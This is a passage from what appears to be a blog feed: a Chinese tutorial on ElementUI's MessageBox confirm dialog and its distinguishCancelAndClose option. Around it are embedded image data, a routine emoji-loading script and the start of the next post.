ICDB1S0uoBwECBAgQIECAAIEuFIiA1Nl//pH11uzNb35TesPrX5vnm7XDrLT77rul3//+3nz7v6/+aRbQejR98m/+Kg9WzX/ggXTf/fPTf115VXrZCcenzSNC1bTEef/5wt7gUuw65GA9mJqI2rY5cT1PhWuyYE78+7Pjamn85n2njWDQwVmQqXGZkO2/8o7GlJSO26uWzlrXQ6n/ntZbp+yV0inZMQMtEXr6yi9SuqpFIGugY6QTINB5gfKdvPPndAYCBAgQIECAAAECBEZIIHoM/c0nzst6FM2r12DHHeekS752Ubrwy//YL/2tb3lzevmpJ9fzDbbyxOOP13dPmTI5ffYzn0qvefWr6ml33X1P+qu//tt07sc+Ug8oXXTR19Ly5cuzXkzlx5KrfvLf6e7smFj2fN4e6WABprplO1eiJ9Dlv0vpvkUprcp6KhXLwmW9aZF+S9a0bzi4lnabVuxNaUnWmW3JypSeXNqXFmtrGsrov6d9WxF6mja5feUpiQCB9gisJ1bdnpMohQABAgQIECBAgACB7hHYbvr0NHvWrHqF9t9v/zR9em/0YMnSdZPtZHt32+2P0r777JNuueXW9MCDD+X5DzrogKwX0i5p3LjN8/Q77rwrTx83rm9oWyREIOttZ/xxmrbttulrl1ya59l77z3T9ttvn0477Q3pm9+6LK1atSp9+7vfSy8+6sh8f/yYMGFCenLhwvQPX/xSnha9myIYFuVZOiNw1Z096ao7U3rHkbV0/B695/ivbPv7N/UOUzt691p631F95/5R1uQXX9+777UH1tJpL+jdtywLOn36JwMPbYtcEcSanwWtNm/oCdVX8uBrMURvsKF8gx9tLwECnRYQYOq0sPIJECBAgAABAgQIdKFAT8MkNkuWLM7f4LY6637y4IMP12u7fOnydMAL9k/HHntMuuTSf8mCSuPSn5/9p2nKlCl5nphrqZhT6YD996sfFyuPPPJI2nLLrdKrXvXyPGj0zLPPpjee9vo8z2lveF26444701FHHZGOP+7Y7Jy9wauigOnTpqXT3/TGdNll307vevdZac6c2cUunx0SiE5k++7QW3iEiO5e0LveGEAqTr33zGxy71f3DpfboeGFfzGf0l+sm5PpridS+vI15WDTt37Xk664pSip2ueLssnAP3B0tWPkJkBg+AQEmIbP2pkIECBAgAA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DnUM6AQIjL2CI3Mi3gRoQIECAAAECBAgQIECAAAECBEa1gADTqG4+lSdAgAABAgQIECBAgAABAgQIjLyAANPIt4EaECBAgAABAgQIECBAgAABAgRGtYAA06huPpUnQIAAAQIECBAgQIAAAQIECIy8gADTyLeBGhAgQIAAAQIECBAgQIAAAQIERrWAANOobj6VJ0CAAAECBAgQIECAAAECBAiMvIAA08i3gRoQIECAAAECBAgQIECAAAECBEa1gADTqG4+lSdAgAABAgQIECBAgAABAgQIjLyAANPIt4EaECBAgAABAgQIECBAgAABAgRGtYAA06huPpUnQIAAAQIECBAgQIAAAQIECIy8gADTyLeBGhAgQIAAAQIECBAgQIAAAQIERrWAANOobj6VJ0CAAAECBAgQIECAAAECBAiMvIAA08i3gRoQIECAAAECBAgQIECAAAECBEa1gADTqG4+lSdAgAABAgQIECBAgAABAgQIjLyAANPIt4EaECBAgAABAgQIjCGBWq2WX21PT88YuurRfalFWxVt186r2dwTWTs5h7UsbTes3E42CgTczkZBI43VKnbiP+Bj1dJ1EyBAgAABAt0jsMXE8Xllnlu8rHsqpSaDChRtVbTdoJkr7pyzbW/AseJhsneBQDe0nWemLvgiqEJdQICpTmGFAAECBAgQIECAQOcFpm45JT/JgkXPpKJnTOfP6gwbKhBtFG0VS9F2G1pWq+OO2KVVqrTRIKDtRkMrqeNwCggwDae2cxEgQIAAAQIECIx5ge2mb50mTpqQli9bme578A/p2eeWCjR14bciAkvRNtFG0VbRZtF27V5eu19KO0/Xi6ndrp0uL9os2s5CgECfwLi+VWsECBAgQIAAAQIECAyHwE6zt08PPbogD1w89MiC4Tilc2yEQASXos06tXzomJQuuLqWHlxoXq5OGbez3AguRZtZCBDoLyDA1N/DFgECBAgQIECAAIGOC0wYPy7tNndWenLhs+mZxUvSiuWr9GLquHq1E8TcNjHnUgyL60TPpcbazNoqpc+8IqXv3VJL189P6ZGnetKatY05rI+0QEzoHXMuxbA4PZdGujWcv1sFBJi6tWXUiwABAgQIECBAYJMXiMBFp4MXmzziJnSBEbjoDV4YMrcJNatLITBmBMzBNGaa2oUSIECAAAECBAgQIECAAAECBDojIMD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QIFAWEGAqm0ghQIAAAQIECBAgQIAAAQIECBCoICDAVAFLVgIECBAgQIAAAQIECBAgQIAAgbKAAFPZRAoBAgQIECBAgAABAgQIECBAgEAFAQGmCliyEiBAgAABAgQIECBAgAABAgQIlAUEmMomUggQIECAAAECBAgQIECAAAECBCoICDBVwJKVAAECBAgQIECAAAECBAgQIECgLCDAVDaRQoAAAQIECBAgQIAAAQIECBAgUEFAgKkClqwECBAgQIAAAQIECBAgQIAAAQJlAQGmsokUAgQIECBAgAABAgQIECBAgACBCgICTBWwZCVAgAABAgQIECBAgAABAgQIECgLCDCVTaQQIECAAAECBAgQIECAAAECBAhUEBBgqoAlKwECBAgQIECAAAECBAgQIECAQFlAgKlsIoUAAQIECBAgQIAAAQIECBAgQKCCgABTBSxZCRAgQIAAAQIECBAgQIAAAQIEygICTGUTKQQIECBAgAABAgQIECBAgAABAhUEBJgqYMlKgAABAgQIECBAgAABAgQIECBQFhBgKptIIUCAAAECBAgQIECAAAECBAgQqCAgwFQBS1YCBAgQIECAAAECBAgQIECAAIGygABT2UQKAQIECBAgQIAAAQIECBAgQIBABQEBpgpYshIgQIAAAQIECBAgQIAAAQIECJQFBJjKJlIIECBAgAABAgQIECBAgAABAgQqCAgwVcCSlQABAgQIECBAgAABAgQIECBAoCwgwFQ2kUKAAAECBAgQIECAAAECBAgQIFBBQICpApasBAgQIECAAAECBAgQIECAAAECZQEBprKJFAIECBAgQIAAAQIECBAgQIAAgQoCAkwVsGQlQIAAAQIECBAgQIAAAQIECBAoCwgwlU2kECBAgAABAgQIECBAgAABAgQIVBAQYKqAJSsBAgQIECBAgAABAgQIECBAgEBZQICpbCKFAAECBAgQIECAAAECBAgQIECggoAAUwUsWQkQIECAAAECBAgQIECAAAECBMoCAkxlEykECBAgQIAAAQIECBAgQIAAAQIVBASYKmDJSoAAAQIECBAgQIAAAQIECBAgUBYQYCqbSCFAgAABAgQIECBAgAABAgQIEKggIMBUAUtWAgQIECBAgAABAgQIECBAgACBsoAAU9lECgECBAgQIECAAAECBAgQIECAQAUBAaYKWLISIECAAAECBAgQIECAAAECBAiUBQSYyiZSCBAgQIAAAQIECBAgQIAAAQIEKggIMFXAkpUAAQIECBAgQIAAAQIECBAgQKAsIMBUNpFCgAABAgQIECBAgAABAgQIECBQQUCAqQKWrAQIECBAgAABAgQIECBAgAABAmUBAaayiRQCBAgQIECAAAECBAgQIECAAIEKAgJMFbBkJUCAAAECBAgQIECAAAECBAgQKAsIMJVNpBAgQIAAAQIECBAgQIAAAQIECFQQEGCqgCUrAQIECBAgQIAAAQIECBAgQIBAWUCAqWwihQABAgQIECBAgAABAgQIECBAoIKAAFMFLFkJECBAgAABAgQIECBAgAABAgTKAgJMZRMpBAgQIECAAAECBAgQIECAAAECFQQEmCpgyUqAAAECBAgQIECAAAECBAgQIFAWEGAqm0ghQIAAAQIECBAgQIAAAQIECBCoICDAVAFLVgIECBAgQIAAAQIECBAgQIAAgbKAAFPZRAoBAgQIECBAgAABAgQIECBAgEAFAQGmCliyEiBAgAABAgQIECBAgAABAgQIlAUEmMomUggQIECAAAECBAgQIECAAAECBCoICDBVwJKVAAECBAgQIECAAAECBAgQIECgLCDAVDaRQoAAAQIECBAgQIAAAQIECBAgUEFAgKkClqwECBAgQIAAAQIECBAgQIAAAQJlAQGmsokUAgQIECBAgAABAgQIECBAgACBCgICTBWwZCVAgAABAgQIECBAgAABAgQIECgLCDCVTaQQIECAAAECBAgQIECAAAECBAhUEBBgqoAlKwECBAgQIECAAAECBAgQIECAQFlAgKlsIoUAAQIECBAgQIAAAQIECBAgQKCCgABTBSxZCRAgQIAAAQIECBAgQIAAAQIEygICTGUTKQQIECBAgAABAgQIECBAgAABAhUEBJgqYMlKgAABAgQIECBAgAABAgQIECBQFhBgKptIIUCAAAECBAgQIECAAAECBAgQqCAgwFQBS1YCBAgQIECAAAECBAgQIECAAIGygABT2UQKAQIECBAgQIAAAQIECBAgQIBABQEBpgpYshIgQIAAAQIECBAgQIAAAQIECJQFBJjKJlIIECBAgAABAgQIECBAgAABAgQqCAgwVcCSlQABAgQIECBAgAABAgQIECBAoCwgwFQ2kUKAAAECBAgQIECAAAECBAgQIFBBQICpApasBAgQIECAAAECBAgQIECAAAECZQEBprKJFAIECBAgQIAAAQIECBAgQIAAgQoCAkwVsGQlQIAAAQIECBAgQIAAAQIECBAoCwgwlU2kECBAgAABAgQIECBAgAABAgQIVBAQYKqAJSsBAgQIECBAgAABAgQIECBAgEBZQICpbCKFAAECBAgQIECAAAECBAgQIECggoAAUwUsWQkQIECAAAECBAgQIECAAAECBMoCAkxlEykECBAgQIAAAQIECBAgQIAAAQIVBASYKmDJSoAAAQIECBAgQIAAAQIECBAgUBYQYCqbSCFAgAABAgQIECBAgAABAgQIEKggIMBUAUtWAgQIECBAgAABAgQIECBAgACBsoAAU9lECgECBAgQIECAAAECBAgQIECAQAUBAaYKWLISIECAAAECBAgQIECAAAECBAiUBQSYyiZSCBAgQIAAAQIECBAgQIAAAQIEKggIMFXAkpUAAQIECBAgQIAAAQIECBAgQKAsIMBUNpFCgAABAgQIECBAgAABAgQIECBQQUCAqQKWrAQIECBAgAABAgQIECBAgAABAmUBAaayiRQCBAgQIECAAAECBAgQIECAAIEKAgJMFbBkJUCAAAECBAgQIECAAAECBAgQKAsIMJVNpBAgQIAAAQIECBAgQIAAAQIECFQQEGCqgCUrAQIECBAgQIAAAQIECBAgQIBAWUCAqWwihQABAgQIECBAgAABAgQIECBAoIKAAFMFLFkJECBAgAABAgQIECBAgAABAgTKAgJMZRMpBAgQIECAAAECBAgQIECAAAECFQQEmCpgyUqAAAECBAgQIECAAAECBAgQIFAWEGAqm0ghQIAAAQIECBAgQIAAAQIECBCoIPD/ASqcv6k0If2aAAAAAElFTkSuQmCC" alt=""><br>一般用于提醒、警告、确认、权限等操作，而实现这样一个效果ElememtUI有非常方便的MessageBox。<br>##2. 调用方法</p><pre><code>&lt;template&gt;  &lt;el-button type="text" @click="open"&gt;点击打开 Message Box&lt;/el-button&gt;&lt;/template&gt;&lt;script&gt;  export default {    methods: {      open() {        this.$confirm('此操作将永久删除该文件, 是否继续?', '提示', {          confirmButtonText: '确定',          cancelButtonText: '取消',          type: 'warning'        }).then(() =&gt; {          console.log("成功")                  }).catch(() =&gt; {          console.log("取消")        });      }    }  }&lt;/script&gt;</code></pre><p>其中，需要给触发元素绑定方法，一般为<code>click</code>,<br>其次要在调用的方法中调用<code>this.$confirm</code>，</p><ul><li>需要传入提示文字(string)作为第一个参数</li><li>需要传入弹窗标题文字(string)作为第二个参数</li><li>需要传入<code>options</code>作为第三个参数</li></ul><p>##3. options参数</p><p>options内部文档有很多参数，具体请查阅<a href="https://element.eleme.cn/#/zh-CN/component/message-box" target="_blank" rel="noopener">官方文档</a><br>这里只介绍常用参数</p><table><thead><tr><th align="center">参数</th><th align="center">说明</th><th align="center">默认值</th></tr></thead><tbody><tr><td align="center">type</td><td align="center">消息类型，用于显示图标</td><td align="center">-</td></tr><tr><td align="center">cancelButtonText</td><td align="center">取消按钮的文本内容</td><td align="center">取消</td></tr><tr><td align="center">confirmButtonText</td><td align="center">确定按钮的文本内容</td><td align="center">确定</td></tr><tr><td align="center">center</td><td align="center">是否为居中布局</td><td align="center">false</td></tr><tr><td align="center">distinguishCancelAndClose</td><td align="center">区分取消和X按钮</td><td align="center">false</td></tr></tbody></table><p>##4. 需求实现<br>工作过程中接到一个需求，弹窗中取消和X按钮的动作是不同的。<br><code>distinguishCancelAndClose</code><br>于是便用到了<code>distinguishCancelAndClose</code>参数，传入参数后用<code>action</code>获取不同的状态进行判断然后调用不同的动作</p><pre><code>warning() {    this.$confirm("此操作将永久删除该文件，是否继续", "提示", {        distinguishCancelAndClose: true,        confirmButtonText: '确定',        cancelButtonText: '取消',        type: 'warning'    }).then(() =&gt; {        this.$message({            type: 'success',            message:"删除成功",        });    }).catch(action =&gt; {        if(action === 'cancel'){            this.$message({            type: 'info',            message:'已取消'            })        }else if(action === 'close') {            this.$message({            type: 'info',            message:'已经关闭'            })        }    })}</code></pre><!--###2. `beforeClose`我还发现了一个属性`beforeClose`,他会接受一个回调函数，用于在弹窗关闭前执行回调函数，因为三个状态都会关闭弹窗，所以都可以修改相应的动作。参数 | 说明 | 参数类型 :-: | :-: | :-: beforeClose | MessageBox关闭前的回调，会暂停实例的关闭 | function(action,instance,done)回调函数接受参数参数 | 说明 | 参数类型 :-: | :-: | :-: action | 触发的弹窗转态 | confirm/cancel/closeinstance | MessageBox实例 |  -done | 用于关闭MessageBox实例| -不行 拿不到close 不知道为啥--><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>变量解构赋值</title>
      <link href="/2019/09/19/bian-liang-jie-gou-fu-zhi/"/>
      <url>/2019/09/19/bian-liang-jie-gou-fu-zhi/</url>
      
